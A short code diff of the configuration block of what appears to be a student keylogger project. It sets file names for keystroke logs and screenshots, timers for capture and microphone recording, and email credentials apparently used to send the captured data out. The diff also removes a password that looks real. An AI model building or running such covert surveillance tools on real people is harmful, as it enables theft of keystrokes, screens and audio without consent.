@@ -23,7 +23,7 @@ screenshot_information = "screenshot.png"
 keys_information = "key_log.txt"
 extend = "\\"
 
-file_path = #"your path where you want to store files"   # "C:\\Users\\Public\\Roaming"
+file_path = "H:\College\Mini-Project"   # "C:\\Users\\Public\\Roaming"
 
 # Time Controls
 time_iteration = 15 # 7200 # 2 hours
@@ -33,7 +33,7 @@ microphone_time = 10 # 600 is 10 minutes
 
 # Email Controls
 email_address = "abc@gmail.com" #Enter your Email
-password = "tgzrjstppnntpenj"   #Enter any password
+password = " "   #Enter valid password
 
 
 #######################################################
